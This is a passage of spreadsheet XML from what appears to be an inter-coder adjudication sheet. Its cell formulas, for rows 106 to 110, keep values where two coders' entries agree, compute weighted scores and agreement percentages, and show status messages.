        <f>IF(AND(Coder1!W106&amp;""&lt;&gt;"",Coder1!W106&amp;""=Coder2!W106&amp;""),Coder1!W106,"")</f>
        <v/>
      </c>
      <c r="X106" s="14">
        <f>IF(AND(Coder1!X106&amp;""&lt;&gt;"",Coder1!X106&amp;""=Coder2!X106&amp;""),Coder1!X106,"")</f>
        <v/>
      </c>
      <c r="Y106" s="14">
        <f>IF(AND(Coder1!Y106&amp;""&lt;&gt;"",Coder1!Y106&amp;""=Coder2!Y106&amp;""),Coder1!Y106,"")</f>
        <v/>
      </c>
      <c r="Z106" s="14">
        <f>IF(AND(Coder1!Z106&amp;""&lt;&gt;"",Coder1!Z106&amp;""=Coder2!Z106&amp;""),Coder1!Z106,"")</f>
        <v/>
      </c>
      <c r="AA106" s="14">
        <f>IF(AND(Coder1!AA106&amp;""&lt;&gt;"",Coder1!AA106&amp;""=Coder2!AA106&amp;""),Coder1!AA106,"")</f>
        <v/>
      </c>
      <c r="AB106" s="14">
        <f>IF(AND(Coder1!AB106&amp;""&lt;&gt;"",Coder1!AB106&amp;""=Coder2!AB106&amp;""),Coder1!AB106,"")</f>
        <v/>
      </c>
      <c r="AC106" s="14">
        <f>IF(AND(Coder1!AC106&amp;""&lt;&gt;"",Coder1!AC106&amp;""=Coder2!AC106&amp;""),Coder1!AC106,"")</f>
        <v/>
      </c>
      <c r="AD106" s="14">
        <f>IF(AND(Coder1!AD106&amp;""&lt;&gt;"",Coder1!AD106&amp;""=Coder2!AD106&amp;""),Coder1!AD106,"")</f>
        <v/>
      </c>
      <c r="AE106" s="14">
        <f>IF(AND(Coder1!AE106&amp;""&lt;&gt;"",Coder1!AE106&amp;""=Coder2!AE106&amp;""),Coder1!AE106,"")</f>
        <v/>
      </c>
      <c r="AF106" s="14">
        <f>IF(AND(Coder1!AF106&amp;""&lt;&gt;"",Coder1!AF106&amp;""=Coder2!AF106&amp;""),Coder1!AF106,"")</f>
        <v/>
      </c>
      <c r="AG106" s="14">
        <f>IF(AND(Coder1!AG106&amp;""&lt;&gt;"",Coder1!AG106&amp;""=Coder2!AG106&amp;""),Coder1!AG106,"")</f>
        <v/>
      </c>
      <c r="AH106" s="14">
        <f>IF(AND(Coder1!AH106&amp;""&lt;&gt;"",Coder1!AH106&amp;""=Coder2!AH106&amp;""),Coder1!AH106,"")</f>
        <v/>
      </c>
      <c r="AI106" s="11">
        <f>IF(COUNT(E106:L106)=0,"",SUM(E106:L106))</f>
        <v/>
      </c>
      <c r="AJ106" s="11">
        <f>IF(AI106="","",N(E106)*3+N(F106)*2+N(G106)*2+N(H106)*2+N(I106)*2+N(J106)*3+N(K106)*3+N(L106)*3)</f>
        <v/>
      </c>
      <c r="AK106" s="11">
        <f>IF(AI106="","",COUNTIF(N106:AG106,1))</f>
        <v/>
      </c>
      <c r="AL106" s="11">
        <f>IF(OR(AJ106="",AJ106=0),"",ROUND(100*(AJ106-AK106)/AJ106,1))</f>
        <v/>
      </c>
      <c r="AM106" s="11">
        <f>IF(AND(Coder1!AN106=1,Coder2!AN106=1),IF(COUNTBLANK(E106:AH106)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN106" s="11">
        <f>IF(AND(Coder1!AN106=1,Coder2!AN106=1),IF(SUMPRODUCT(--(Coder1!E106:AH106&amp;""&lt;&gt;Coder2!E106:AH106&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO106" s="11" t="n"/>
    </row>
    <row r="107">
      <c r="A107" s="11">
        <f>Coder1!A107</f>
        <v/>
      </c>
      <c r="B107" s="11">
        <f>Coder1!B107</f>
        <v/>
      </c>
      <c r="C107" s="11">
        <f>Coder1!C107</f>
        <v/>
      </c>
      <c r="D107" s="11">
        <f>Coder1!D107</f>
        <v/>
      </c>
      <c r="E107" s="14">
        <f>IF(AND(Coder1!E107&amp;""&lt;&gt;"",Coder1!E107&amp;""=Coder2!E107&amp;""),Coder1!E107,"")</f>
        <v/>
      </c>
      <c r="F107" s="14">
        <f>IF(AND(Coder1!F107&amp;""&lt;&gt;"",Coder1!F107&amp;""=Coder2!F107&amp;""),Coder1!F107,"")</f>
        <v/>
      </c>
      <c r="G107" s="14">
        <f>IF(AND(Coder1!G107&amp;""&lt;&gt;"",Coder1!G107&amp;""=Coder2!G107&amp;""),Coder1!G107,"")</f>
        <v/>
      </c>
      <c r="H107" s="14">
        <f>IF(AND(Coder1!H107&amp;""&lt;&gt;"",Coder1!H107&amp;""=Coder2!H107&amp;""),Coder1!H107,"")</f>
        <v/>
      </c>
      <c r="I107" s="14">
        <f>IF(AND(Coder1!I107&amp;""&lt;&gt;"",Coder1!I107&amp;""=Coder2!I107&amp;""),Coder1!I107,"")</f>
        <v/>
      </c>
      <c r="J107" s="14">
        <f>IF(AND(Coder1!J107&amp;""&lt;&gt;"",Coder1!J107&amp;""=Coder2!J107&amp;""),Coder1!J107,"")</f>
        <v/>
      </c>
      <c r="K107" s="14">
        <f>IF(AND(Coder1!K107&amp;""&lt;&gt;"",Coder1!K107&amp;""=Coder2!K107&amp;""),Coder1!K107,"")</f>
        <v/>
      </c>
      <c r="L107" s="14">
        <f>IF(AND(Coder1!L107&amp;""&lt;&gt;"",Coder1!L107&amp;""=Coder2!L107&amp;""),Coder1!L107,"")</f>
        <v/>
      </c>
      <c r="M107" s="14">
        <f>IF(AND(Coder1!M107&amp;""&lt;&gt;"",Coder1!M107&amp;""=Coder2!M107&amp;""),Coder1!M107,"")</f>
        <v/>
      </c>
      <c r="N107" s="14">
        <f>IF(AND(Coder1!N107&amp;""&lt;&gt;"",Coder1!N107&amp;""=Coder2!N107&amp;""),Coder1!N107,"")</f>
        <v/>
      </c>
      <c r="O107" s="14">
        <f>IF(AND(Coder1!O107&amp;""&lt;&gt;"",Coder1!O107&amp;""=Coder2!O107&amp;""),Coder1!O107,"")</f>
        <v/>
      </c>
      <c r="P107" s="14">
        <f>IF(AND(Coder1!P107&amp;""&lt;&gt;"",Coder1!P107&amp;""=Coder2!P107&amp;""),Coder1!P107,"")</f>
        <v/>
      </c>
      <c r="Q107" s="14">
        <f>IF(AND(Coder1!Q107&amp;""&lt;&gt;"",Coder1!Q107&amp;""=Coder2!Q107&amp;""),Coder1!Q107,"")</f>
        <v/>
      </c>
      <c r="R107" s="14">
        <f>IF(AND(Coder1!R107&amp;""&lt;&gt;"",Coder1!R107&amp;""=Coder2!R107&amp;""),Coder1!R107,"")</f>
        <v/>
      </c>
      <c r="S107" s="14">
        <f>IF(AND(Coder1!S107&amp;""&lt;&gt;"",Coder1!S107&amp;""=Coder2!S107&amp;""),Coder1!S107,"")</f>
        <v/>
      </c>
      <c r="T107" s="14">
        <f>IF(AND(Coder1!T107&amp;""&lt;&gt;"",Coder1!T107&amp;""=Coder2!T107&amp;""),Coder1!T107,"")</f>
        <v/>
      </c>
      <c r="U107" s="14">
        <f>IF(AND(Coder1!U107&amp;""&lt;&gt;"",Coder1!U107&amp;""=Coder2!U107&amp;""),Coder1!U107,"")</f>
        <v/>
      </c>
      <c r="V107" s="14">
        <f>IF(AND(Coder1!V107&amp;""&lt;&gt;"",Coder1!V107&amp;""=Coder2!V107&amp;""),Coder1!V107,"")</f>
        <v/>
      </c>
      <c r="W107" s="14">
        <f>IF(AND(Coder1!W107&amp;""&lt;&gt;"",Coder1!W107&amp;""=Coder2!W107&amp;""),Coder1!W107,"")</f>
        <v/>
      </c>
      <c r="X107" s="14">
        <f>IF(AND(Coder1!X107&amp;""&lt;&gt;"",Coder1!X107&amp;""=Coder2!X107&amp;""),Coder1!X107,"")</f>
        <v/>
      </c>
      <c r="Y107" s="14">
        <f>IF(AND(Coder1!Y107&amp;""&lt;&gt;"",Coder1!Y107&amp;""=Coder2!Y107&amp;""),Coder1!Y107,"")</f>
        <v/>
      </c>
      <c r="Z107" s="14">
        <f>IF(AND(Coder1!Z107&amp;""&lt;&gt;"",Coder1!Z107&amp;""=Coder2!Z107&amp;""),Coder1!Z107,"")</f>
        <v/>
      </c>
      <c r="AA107" s="14">
        <f>IF(AND(Coder1!AA107&amp;""&lt;&gt;"",Coder1!AA107&amp;""=Coder2!AA107&amp;""),Coder1!AA107,"")</f>
        <v/>
      </c>
      <c r="AB107" s="14">
        <f>IF(AND(Coder1!AB107&amp;""&lt;&gt;"",Coder1!AB107&amp;""=Coder2!AB107&amp;""),Coder1!AB107,"")</f>
        <v/>
      </c>
      <c r="AC107" s="14">
        <f>IF(AND(Coder1!AC107&amp;""&lt;&gt;"",Coder1!AC107&amp;""=Coder2!AC107&amp;""),Coder1!AC107,"")</f>
        <v/>
      </c>
      <c r="AD107" s="14">
        <f>IF(AND(Coder1!AD107&amp;""&lt;&gt;"",Coder1!AD107&amp;""=Coder2!AD107&amp;""),Coder1!AD107,"")</f>
        <v/>
      </c>
      <c r="AE107" s="14">
        <f>IF(AND(Coder1!AE107&amp;""&lt;&gt;"",Coder1!AE107&amp;""=Coder2!AE107&amp;""),Coder1!AE107,"")</f>
        <v/>
      </c>
      <c r="AF107" s="14">
        <f>IF(AND(Coder1!AF107&amp;""&lt;&gt;"",Coder1!AF107&amp;""=Coder2!AF107&amp;""),Coder1!AF107,"")</f>
        <v/>
      </c>
      <c r="AG107" s="14">
        <f>IF(AND(Coder1!AG107&amp;""&lt;&gt;"",Coder1!AG107&amp;""=Coder2!AG107&amp;""),Coder1!AG107,"")</f>
        <v/>
      </c>
      <c r="AH107" s="14">
        <f>IF(AND(Coder1!AH107&amp;""&lt;&gt;"",Coder1!AH107&amp;""=Coder2!AH107&amp;""),Coder1!AH107,"")</f>
        <v/>
      </c>
      <c r="AI107" s="11">
        <f>IF(COUNT(E107:L107)=0,"",SUM(E107:L107))</f>
        <v/>
      </c>
      <c r="AJ107" s="11">
        <f>IF(AI107="","",N(E107)*3+N(F107)*2+N(G107)*2+N(H107)*2+N(I107)*2+N(J107)*3+N(K107)*3+N(L107)*3)</f>
        <v/>
      </c>
      <c r="AK107" s="11">
        <f>IF(AI107="","",COUNTIF(N107:AG107,1))</f>
        <v/>
      </c>
      <c r="AL107" s="11">
        <f>IF(OR(AJ107="",AJ107=0),"",ROUND(100*(AJ107-AK107)/AJ107,1))</f>
        <v/>
      </c>
      <c r="AM107" s="11">
        <f>IF(AND(Coder1!AN107=1,Coder2!AN107=1),IF(COUNTBLANK(E107:AH107)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN107" s="11">
        <f>IF(AND(Coder1!AN107=1,Coder2!AN107=1),IF(SUMPRODUCT(--(Coder1!E107:AH107&amp;""&lt;&gt;Coder2!E107:AH107&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO107" s="11" t="n"/>
    </row>
    <row r="108">
      <c r="A108" s="11">
        <f>Coder1!A108</f>
        <v/>
      </c>
      <c r="B108" s="11">
        <f>Coder1!B108</f>
        <v/>
      </c>
      <c r="C108" s="11">
        <f>Coder1!C108</f>
        <v/>
      </c>
      <c r="D108" s="11">
        <f>Coder1!D108</f>
        <v/>
      </c>
      <c r="E108" s="14">
        <f>IF(AND(Coder1!E108&amp;""&lt;&gt;"",Coder1!E108&amp;""=Coder2!E108&amp;""),Coder1!E108,"")</f>
        <v/>
      </c>
      <c r="F108" s="14">
        <f>IF(AND(Coder1!F108&amp;""&lt;&gt;"",Coder1!F108&amp;""=Coder2!F108&amp;""),Coder1!F108,"")</f>
        <v/>
      </c>
      <c r="G108" s="14">
        <f>IF(AND(Coder1!G108&amp;""&lt;&gt;"",Coder1!G108&amp;""=Coder2!G108&amp;""),Coder1!G108,"")</f>
        <v/>
      </c>
      <c r="H108" s="14">
        <f>IF(AND(Coder1!H108&amp;""&lt;&gt;"",Coder1!H108&amp;""=Coder2!H108&amp;""),Coder1!H108,"")</f>
        <v/>
      </c>
      <c r="I108" s="14">
        <f>IF(AND(Coder1!I108&amp;""&lt;&gt;"",Coder1!I108&amp;""=Coder2!I108&amp;""),Coder1!I108,"")</f>
        <v/>
      </c>
      <c r="J108" s="14">
        <f>IF(AND(Coder1!J108&amp;""&lt;&gt;"",Coder1!J108&amp;""=Coder2!J108&amp;""),Coder1!J108,"")</f>
        <v/>
      </c>
      <c r="K108" s="14">
        <f>IF(AND(Coder1!K108&amp;""&lt;&gt;"",Coder1!K108&amp;""=Coder2!K108&amp;""),Coder1!K108,"")</f>
        <v/>
      </c>
      <c r="L108" s="14">
        <f>IF(AND(Coder1!L108&amp;""&lt;&gt;"",Coder1!L108&amp;""=Coder2!L108&amp;""),Coder1!L108,"")</f>
        <v/>
      </c>
      <c r="M108" s="14">
        <f>IF(AND(Coder1!M108&amp;""&lt;&gt;"",Coder1!M108&amp;""=Coder2!M108&amp;""),Coder1!M108,"")</f>
        <v/>
      </c>
      <c r="N108" s="14">
        <f>IF(AND(Coder1!N108&amp;""&lt;&gt;"",Coder1!N108&amp;""=Coder2!N108&amp;""),Coder1!N108,"")</f>
        <v/>
      </c>
      <c r="O108" s="14">
        <f>IF(AND(Coder1!O108&amp;""&lt;&gt;"",Coder1!O108&amp;""=Coder2!O108&amp;""),Coder1!O108,"")</f>
        <v/>
      </c>
      <c r="P108" s="14">
        <f>IF(AND(Coder1!P108&amp;""&lt;&gt;"",Coder1!P108&amp;""=Coder2!P108&amp;""),Coder1!P108,"")</f>
        <v/>
      </c>
      <c r="Q108" s="14">
        <f>IF(AND(Coder1!Q108&amp;""&lt;&gt;"",Coder1!Q108&amp;""=Coder2!Q108&amp;""),Coder1!Q108,"")</f>
        <v/>
      </c>
      <c r="R108" s="14">
        <f>IF(AND(Coder1!R108&amp;""&lt;&gt;"",Coder1!R108&amp;""=Coder2!R108&amp;""),Coder1!R108,"")</f>
        <v/>
      </c>
      <c r="S108" s="14">
        <f>IF(AND(Coder1!S108&amp;""&lt;&gt;"",Coder1!S108&amp;""=Coder2!S108&amp;""),Coder1!S108,"")</f>
        <v/>
      </c>
      <c r="T108" s="14">
        <f>IF(AND(Coder1!T108&amp;""&lt;&gt;"",Coder1!T108&amp;""=Coder2!T108&amp;""),Coder1!T108,"")</f>
        <v/>
      </c>
      <c r="U108" s="14">
        <f>IF(AND(Coder1!U108&amp;""&lt;&gt;"",Coder1!U108&amp;""=Coder2!U108&amp;""),Coder1!U108,"")</f>
        <v/>
      </c>
      <c r="V108" s="14">
        <f>IF(AND(Coder1!V108&amp;""&lt;&gt;"",Coder1!V108&amp;""=Coder2!V108&amp;""),Coder1!V108,"")</f>
        <v/>
      </c>
      <c r="W108" s="14">
        <f>IF(AND(Coder1!W108&amp;""&lt;&gt;"",Coder1!W108&amp;""=Coder2!W108&amp;""),Coder1!W108,"")</f>
        <v/>
      </c>
      <c r="X108" s="14">
        <f>IF(AND(Coder1!X108&amp;""&lt;&gt;"",Coder1!X108&amp;""=Coder2!X108&amp;""),Coder1!X108,"")</f>
        <v/>
      </c>
      <c r="Y108" s="14">
        <f>IF(AND(Coder1!Y108&amp;""&lt;&gt;"",Coder1!Y108&amp;""=Coder2!Y108&amp;""),Coder1!Y108,"")</f>
        <v/>
      </c>
      <c r="Z108" s="14">
        <f>IF(AND(Coder1!Z108&amp;""&lt;&gt;"",Coder1!Z108&amp;""=Coder2!Z108&amp;""),Coder1!Z108,"")</f>
        <v/>
      </c>
      <c r="AA108" s="14">
        <f>IF(AND(Coder1!AA108&amp;""&lt;&gt;"",Coder1!AA108&amp;""=Coder2!AA108&amp;""),Coder1!AA108,"")</f>
        <v/>
      </c>
      <c r="AB108" s="14">
        <f>IF(AND(Coder1!AB108&amp;""&lt;&gt;"",Coder1!AB108&amp;""=Coder2!AB108&amp;""),Coder1!AB108,"")</f>
        <v/>
      </c>
      <c r="AC108" s="14">
        <f>IF(AND(Coder1!AC108&amp;""&lt;&gt;"",Coder1!AC108&amp;""=Coder2!AC108&amp;""),Coder1!AC108,"")</f>
        <v/>
      </c>
      <c r="AD108" s="14">
        <f>IF(AND(Coder1!AD108&amp;""&lt;&gt;"",Coder1!AD108&amp;""=Coder2!AD108&amp;""),Coder1!AD108,"")</f>
        <v/>
      </c>
      <c r="AE108" s="14">
        <f>IF(AND(Coder1!AE108&amp;""&lt;&gt;"",Coder1!AE108&amp;""=Coder2!AE108&amp;""),Coder1!AE108,"")</f>
        <v/>
      </c>
      <c r="AF108" s="14">
        <f>IF(AND(Coder1!AF108&amp;""&lt;&gt;"",Coder1!AF108&amp;""=Coder2!AF108&amp;""),Coder1!AF108,"")</f>
        <v/>
      </c>
      <c r="AG108" s="14">
        <f>IF(AND(Coder1!AG108&amp;""&lt;&gt;"",Coder1!AG108&amp;""=Coder2!AG108&amp;""),Coder1!AG108,"")</f>
        <v/>
      </c>
      <c r="AH108" s="14">
        <f>IF(AND(Coder1!AH108&amp;""&lt;&gt;"",Coder1!AH108&amp;""=Coder2!AH108&amp;""),Coder1!AH108,"")</f>
        <v/>
      </c>
      <c r="AI108" s="11">
        <f>IF(COUNT(E108:L108)=0,"",SUM(E108:L108))</f>
        <v/>
      </c>
      <c r="AJ108" s="11">
        <f>IF(AI108="","",N(E108)*3+N(F108)*2+N(G108)*2+N(H108)*2+N(I108)*2+N(J108)*3+N(K108)*3+N(L108)*3)</f>
        <v/>
      </c>
      <c r="AK108" s="11">
        <f>IF(AI108="","",COUNTIF(N108:AG108,1))</f>
        <v/>
      </c>
      <c r="AL108" s="11">
        <f>IF(OR(AJ108="",AJ108=0),"",ROUND(100*(AJ108-AK108)/AJ108,1))</f>
        <v/>
      </c>
      <c r="AM108" s="11">
        <f>IF(AND(Coder1!AN108=1,Coder2!AN108=1),IF(COUNTBLANK(E108:AH108)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN108" s="11">
        <f>IF(AND(Coder1!AN108=1,Coder2!AN108=1),IF(SUMPRODUCT(--(Coder1!E108:AH108&amp;""&lt;&gt;Coder2!E108:AH108&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO108" s="11" t="n"/>
    </row>
    <row r="109">
      <c r="A109" s="11">
        <f>Coder1!A109</f>
        <v/>
      </c>
      <c r="B109" s="11">
        <f>Coder1!B109</f>
        <v/>
      </c>
      <c r="C109" s="11">
        <f>Coder1!C109</f>
        <v/>
      </c>
      <c r="D109" s="11">
        <f>Coder1!D109</f>
        <v/>
      </c>
      <c r="E109" s="14">
        <f>IF(AND(Coder1!E109&amp;""&lt;&gt;"",Coder1!E109&amp;""=Coder2!E109&amp;""),Coder1!E109,"")</f>
        <v/>
      </c>
      <c r="F109" s="14">
        <f>IF(AND(Coder1!F109&amp;""&lt;&gt;"",Coder1!F109&amp;""=Coder2!F109&amp;""),Coder1!F109,"")</f>
        <v/>
      </c>
      <c r="G109" s="14">
        <f>IF(AND(Coder1!G109&amp;""&lt;&gt;"",Coder1!G109&amp;""=Coder2!G109&amp;""),Coder1!G109,"")</f>
        <v/>
      </c>
      <c r="H109" s="14">
        <f>IF(AND(Coder1!H109&amp;""&lt;&gt;"",Coder1!H109&amp;""=Coder2!H109&amp;""),Coder1!H109,"")</f>
        <v/>
      </c>
      <c r="I109" s="14">
        <f>IF(AND(Coder1!I109&amp;""&lt;&gt;"",Coder1!I109&amp;""=Coder2!I109&amp;""),Coder1!I109,"")</f>
        <v/>
      </c>
      <c r="J109" s="14">
        <f>IF(AND(Coder1!J109&amp;""&lt;&gt;"",Coder1!J109&amp;""=Coder2!J109&amp;""),Coder1!J109,"")</f>
        <v/>
      </c>
      <c r="K109" s="14">
        <f>IF(AND(Coder1!K109&amp;""&lt;&gt;"",Coder1!K109&amp;""=Coder2!K109&amp;""),Coder1!K109,"")</f>
        <v/>
      </c>
      <c r="L109" s="14">
        <f>IF(AND(Coder1!L109&amp;""&lt;&gt;"",Coder1!L109&amp;""=Coder2!L109&amp;""),Coder1!L109,"")</f>
        <v/>
      </c>
      <c r="M109" s="14">
        <f>IF(AND(Coder1!M109&amp;""&lt;&gt;"",Coder1!M109&amp;""=Coder2!M109&amp;""),Coder1!M109,"")</f>
        <v/>
      </c>
      <c r="N109" s="14">
        <f>IF(AND(Coder1!N109&amp;""&lt;&gt;"",Coder1!N109&amp;""=Coder2!N109&amp;""),Coder1!N109,"")</f>
        <v/>
      </c>
      <c r="O109" s="14">
        <f>IF(AND(Coder1!O109&amp;""&lt;&gt;"",Coder1!O109&amp;""=Coder2!O109&amp;""),Coder1!O109,"")</f>
        <v/>
      </c>
      <c r="P109" s="14">
        <f>IF(AND(Coder1!P109&amp;""&lt;&gt;"",Coder1!P109&amp;""=Coder2!P109&amp;""),Coder1!P109,"")</f>
        <v/>
      </c>
      <c r="Q109" s="14">
        <f>IF(AND(Coder1!Q109&amp;""&lt;&gt;"",Coder1!Q109&amp;""=Coder2!Q109&amp;""),Coder1!Q109,"")</f>
        <v/>
      </c>
      <c r="R109" s="14">
        <f>IF(AND(Coder1!R109&amp;""&lt;&gt;"",Coder1!R109&amp;""=Coder2!R109&amp;""),Coder1!R109,"")</f>
        <v/>
      </c>
      <c r="S109" s="14">
        <f>IF(AND(Coder1!S109&amp;""&lt;&gt;"",Coder1!S109&amp;""=Coder2!S109&amp;""),Coder1!S109,"")</f>
        <v/>
      </c>
      <c r="T109" s="14">
        <f>IF(AND(Coder1!T109&amp;""&lt;&gt;"",Coder1!T109&amp;""=Coder2!T109&amp;""),Coder1!T109,"")</f>
        <v/>
      </c>
      <c r="U109" s="14">
        <f>IF(AND(Coder1!U109&amp;""&lt;&gt;"",Coder1!U109&amp;""=Coder2!U109&amp;""),Coder1!U109,"")</f>
        <v/>
      </c>
      <c r="V109" s="14">
        <f>IF(AND(Coder1!V109&amp;""&lt;&gt;"",Coder1!V109&amp;""=Coder2!V109&amp;""),Coder1!V109,"")</f>
        <v/>
      </c>
      <c r="W109" s="14">
        <f>IF(AND(Coder1!W109&amp;""&lt;&gt;"",Coder1!W109&amp;""=Coder2!W109&amp;""),Coder1!W109,"")</f>
        <v/>
      </c>
      <c r="X109" s="14">
        <f>IF(AND(Coder1!X109&amp;""&lt;&gt;"",Coder1!X109&amp;""=Coder2!X109&amp;""),Coder1!X109,"")</f>
        <v/>
      </c>
      <c r="Y109" s="14">
        <f>IF(AND(Coder1!Y109&amp;""&lt;&gt;"",Coder1!Y109&amp;""=Coder2!Y109&amp;""),Coder1!Y109,"")</f>
        <v/>
      </c>
      <c r="Z109" s="14">
        <f>IF(AND(Coder1!Z109&amp;""&lt;&gt;"",Coder1!Z109&amp;""=Coder2!Z109&amp;""),Coder1!Z109,"")</f>
        <v/>
      </c>
      <c r="AA109" s="14">
        <f>IF(AND(Coder1!AA109&amp;""&lt;&gt;"",Coder1!AA109&amp;""=Coder2!AA109&amp;""),Coder1!AA109,"")</f>
        <v/>
      </c>
      <c r="AB109" s="14">
        <f>IF(AND(Coder1!AB109&amp;""&lt;&gt;"",Coder1!AB109&amp;""=Coder2!AB109&amp;""),Coder1!AB109,"")</f>
        <v/>
      </c>
      <c r="AC109" s="14">
        <f>IF(AND(Coder1!AC109&amp;""&lt;&gt;"",Coder1!AC109&amp;""=Coder2!AC109&amp;""),Coder1!AC109,"")</f>
        <v/>
      </c>
      <c r="AD109" s="14">
        <f>IF(AND(Coder1!AD109&amp;""&lt;&gt;"",Coder1!AD109&amp;""=Coder2!AD109&amp;""),Coder1!AD109,"")</f>
        <v/>
      </c>
      <c r="AE109" s="14">
        <f>IF(AND(Coder1!AE109&amp;""&lt;&gt;"",Coder1!AE109&amp;""=Coder2!AE109&amp;""),Coder1!AE109,"")</f>
        <v/>
      </c>
      <c r="AF109" s="14">
        <f>IF(AND(Coder1!AF109&amp;""&lt;&gt;"",Coder1!AF109&amp;""=Coder2!AF109&amp;""),Coder1!AF109,"")</f>
        <v/>
      </c>
      <c r="AG109" s="14">
        <f>IF(AND(Coder1!AG109&amp;""&lt;&gt;"",Coder1!AG109&amp;""=Coder2!AG109&amp;""),Coder1!AG109,"")</f>
        <v/>
      </c>
      <c r="AH109" s="14">
        <f>IF(AND(Coder1!AH109&amp;""&lt;&gt;"",Coder1!AH109&amp;""=Coder2!AH109&amp;""),Coder1!AH109,"")</f>
        <v/>
      </c>
      <c r="AI109" s="11">
        <f>IF(COUNT(E109:L109)=0,"",SUM(E109:L109))</f>
        <v/>
      </c>
      <c r="AJ109" s="11">
        <f>IF(AI109="","",N(E109)*3+N(F109)*2+N(G109)*2+N(H109)*2+N(I109)*2+N(J109)*3+N(K109)*3+N(L109)*3)</f>
        <v/>
      </c>
      <c r="AK109" s="11">
        <f>IF(AI109="","",COUNTIF(N109:AG109,1))</f>
        <v/>
      </c>
      <c r="AL109" s="11">
        <f>IF(OR(AJ109="",AJ109=0),"",ROUND(100*(AJ109-AK109)/AJ109,1))</f>
        <v/>
      </c>
      <c r="AM109" s="11">
        <f>IF(AND(Coder1!AN109=1,Coder2!AN109=1),IF(COUNTBLANK(E109:AH109)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN109" s="11">
        <f>IF(AND(Coder1!AN109=1,Coder2!AN109=1),IF(SUMPRODUCT(--(Coder1!E109:AH109&amp;""&lt;&gt;Coder2!E109:AH109&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO109" s="11" t="n"/>
    </row>
    <row r="110">
      <c r="A110" s="11">
        <f>Coder1!A110</f>
        <v/>
      </c>
      <c r="B110" s="11">
        <f>Coder1!B110</f>
        <v/>
      </c>
      <c r="C110" s="11">
        <f>Coder1!C110</f>
        <v/>
      </c>
      <c r="D110" s="11">
        <f>Coder1!D110</f>
        <v/>
      </c>
      <c r="E110" s="14">
        <f>IF(AND(Coder1!E110&amp;""&lt;&gt;"",Coder1!E110&amp;""=Coder2!E110&amp;""),Coder1!E110,"")</f>
        <v/>
      </c>
      <c r="F110" s="14">
        <f>IF(AND(Coder1!F110&amp;""&lt;&gt;"",Coder1!F110&amp;""=Coder2!F110&amp;""),Coder1!F110,"")</f>
        <v/>
      </c>
      <c r="G110" s="14">
        <f>IF(AND(Coder1!G110&amp;""&lt;&gt;"",Coder1!G110&amp;""=Coder2!G110&amp;""),Coder1!G110,"")</f>
        <v/>
      </c>
      <c r="H110" s="14">
        <f>IF(AND(Coder1!H110&amp;""&lt;&gt;"",Coder1!H110&amp;""=Coder2!H110&amp;""),Coder1!H110,"")</f>
        <v/>
      </c>
      <c r="I110" s="14">
        <f>IF(AND(Coder1!I110&amp;""&lt;&gt;"",Coder1!I110&amp;""=Coder2!I110&amp;""),Coder1!I110,"")</f>
        <v/>
      </c>
      <c r="J110" s="14">
        <f>IF(AND(Coder1!J110&amp;""&lt;&gt;"",Coder1!J110&amp;""=Coder2!J110&amp;""),Coder1!J110,"")</f>
        <v/>
      </c>
      <c r="K110" s="14">
        <f>IF(AND(Coder1!K110&amp;""&lt;&gt;"",Coder1!K110&amp;""=Coder2!K110&amp;""),Coder1!K110,"")</f>
        <v/>
      </c>
      <c r="L110" s="14">
        <f>IF(AND(Coder1!L110&amp;""&lt;&gt;"",Coder1!L110&amp;""=Coder2!L110&amp;""),Coder1!L110,"")</f>
        <v/>
      </c>
      <c r="M110" s="14">
        <f>IF(AND(Coder1!M110&amp;""&lt;&gt;"",Coder1!M110&amp;""=Coder2!M110&amp;""),Coder1!M110,"")</f>
        <v/>
      </c>
      <c r="N110" s="14">
        <f>IF(AND(Coder1!N110&amp;""&lt;&gt;"",Coder1!N110&amp;""=Coder2!N110&amp;""),Coder1!N110,"")</f>
        <v/>
      </c>
      <c r="O110" s="14">
        <f>IF(AND(Coder1!O110&amp;""&lt;&gt;"",Coder1!O110&amp;""=Coder2!O110&amp;""),Coder1!O110,"")</f>
        <v/>
      </c>
      <c r="P110" s="14">
        <f>IF(AND(Coder1!P110&amp;""&lt;&gt;"",Coder1!P110&amp;""=Coder2!P110&amp;""),Coder1!P110,"")</f>
        <v/>
      </c>
      <c r="Q110" s="14">
        <f>IF(AND(Coder1!Q110&amp;""&lt;&gt;"",Coder1!Q110&amp;""=Coder2!Q110&amp;""),Coder1!Q110,"")</f>
        <v/>
      </c>
      <c r="R110" s="14">
        <f>IF(AND(Coder1!R110&amp;""&lt;&gt;"",Coder1!R110&amp;""=Coder2!R110&amp;""),Coder1!R110,"")</f>
        <v/>
      </c>
      <c r="S110" s="14">
        <f>IF(AND(Coder1!S110&amp;""&lt;&gt;"",Coder1!S110&amp;""=Coder2!S110&amp;""),Coder1!S110,"")</f>
        <v/>
      </c>
      <c r="T110" s="14">
        <f>IF(AND(Coder1!T110&amp;""&lt;&gt;"",Coder1!T110&amp;""=Coder2!T110&amp;""),Coder1!T110,"")</f>
        <v/>
      </c>
      <c r="U110" s="14">
        <f>IF(AND(Coder1!U110&amp;""&lt;&gt;"",Coder1!U110&amp;""=Coder2!U110&amp;""),Coder1!U110,"")</f>
        <v/>
      </c>
      <c r="V110" s="14">
        <f>IF(AND(Coder1!V110&amp;""&lt;&gt;"",Coder1!V110&amp;""=Coder2!V110&amp;""),Coder1!V110,"")</f>
        <v/>
      </c>
      <c r="W110" s="14">
        <f>IF(AND(Coder1!W110&amp;""&lt;&gt;"",Coder1!W110&amp;""=Coder2!W110&amp;""),Coder1!W110,"")</f>
        <v/>
      </c>
      <c r="X110" s="14">
        <f>IF(AND(Coder1!X110&amp;""&lt;&gt;"",Coder1!X110&amp;""=Coder2!X110&amp;""),Coder1!X110,"")</f>
        <v/>
      </c>
      <c r="Y110" s="14">
        <f>IF(AND(Coder1!Y110&amp;""&lt;&gt;"",Coder1!Y110&amp;""=Coder2!Y110&amp;""),Coder1!Y110,"")</f>
        <v/>
      </c>
      <c r="Z110" s="14">
